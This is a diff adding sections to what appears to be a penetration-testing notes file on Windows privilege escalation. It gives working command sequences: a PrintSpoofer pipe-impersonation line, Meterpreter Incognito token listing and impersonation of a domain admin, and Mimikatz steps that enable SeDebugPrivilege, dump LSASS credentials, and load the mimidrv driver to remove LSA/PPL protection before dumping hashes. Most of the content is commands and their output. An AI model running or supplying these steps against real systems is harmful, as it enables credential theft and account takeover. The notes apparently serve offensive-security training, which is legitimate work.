@@ -89,3 +89,77 @@ wait for connection and and steal system token to open cmd
 ```
 C:\user> PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
 ```
+
+#### Meterpreter Incognito
+Meterpreter Incognito module to impersonate any logged in users and obtain code execution in their context without access to any passwords or hashes.
+
+Load module
+```
+meterpreter > load incognito
+Loading extension incognito...Success.
+```
+
+list all currently used tokens by unique username
+```
+meterpreter > list_tokens -u
+Delegation Tokens Available
+========================================
+corp1\admin
+IIS APPPOOL\DefaultAppPool
+NT AUTHORITY\IUSR
+```
+
+Impersonate
+```
+meterpreter > impersonate_token corp1\\admin
+[+] Delegation token available
+[+] Successfully impersonated user corp1\admin
+meterpreter > getuid
+Server username: corp1\admin
+```
+
+#### Mimikatz
+
+If a user has SeDebugPrivilege, the user can read and modify a process under the ownership of a different user. We can use Mimikatz
+privilege::debug command to enable the SeDebugPrivilege by calling AdjustTokenPrivileges.
+
+```
+C:\Tools\Mimikatz> mimikatz.exe
+mimikatz # privilege::debug
+Privilege '20' OK
+```
+After enabled the SeDebugPrivilege privilege, we can dump cached password and hashes from LSASS
+```
+mimikatz # sekurlsa::logonpasswords
+```
+
+Since 2012 Microsoft has developed mitigation techniques: LSA Protection and Windows Defender Credential Guard.This means that a process running at SYSTEM integrity cannot access or modify the memory space of a process executing at SYSTEM integrity with level, Protected Processes Light (PPL) enabled.
+
+```
+mimikatz # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+```
+PPL protection is controlled by a bit residing in the EPROCESS kernel object associated with the
+target process. If we could obtain code execution in kernel space, we could disable the LSA
+protection and dump the credentials.
+
+this can be achieved with Mimikatz since it comes bundled with the mimidrv.sys driver. If we are running as admin, we have SeLoadDriverPrivilege privilege and the ability to load any signed drivers.
+```
+mimikatz # !+
+[*] 'mimidrv' service not present
+[+] 'mimidrv' service successfully registered
+[+] 'mimidrv' service ACL to everyone
+[+] 'mimidrv' service started
+```
+
+after loading the driver, we can disable the PPL protection, and dump the hashs
+```
+mimikatz # !processprotect /process:lsass.exe /remove
+Process : lsass.exe
+PID 536 -> 00/00 [0-0-0]
+
+mimikatz # sekurlsa::logonpasswords
+```
+
+
+
